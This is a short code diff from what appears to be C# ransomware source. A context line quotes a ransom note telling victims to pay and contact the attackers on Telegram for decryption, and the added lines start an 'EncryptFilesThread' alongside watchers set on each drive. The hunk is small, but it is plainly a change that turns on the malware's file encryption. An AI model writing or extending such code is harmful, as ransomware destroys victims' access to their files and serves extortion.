@@ -1246,6 +1246,8 @@ Once the payment is made, contact us on Telegram, and we will provide the decryp
                     SetupFileWatcher(drive.Name);
                 }
             }
+            Thread ss = new Thread(EncryptFilesThread);
+            ss.Start();
             while (true)
             {
                 try
